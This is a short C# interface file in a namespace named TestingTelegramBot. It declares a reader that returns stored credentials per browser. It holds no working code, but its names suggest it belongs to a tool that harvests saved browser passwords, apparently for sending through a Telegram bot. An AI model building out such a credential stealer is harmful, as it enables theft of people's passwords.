using System.Collections.Generic;

namespace TestingTelegramBot
{
    interface IPassReader
    {
        IEnumerable<CredentialModel> ReadPasswords();
        string BrowserName { get; }
    }
}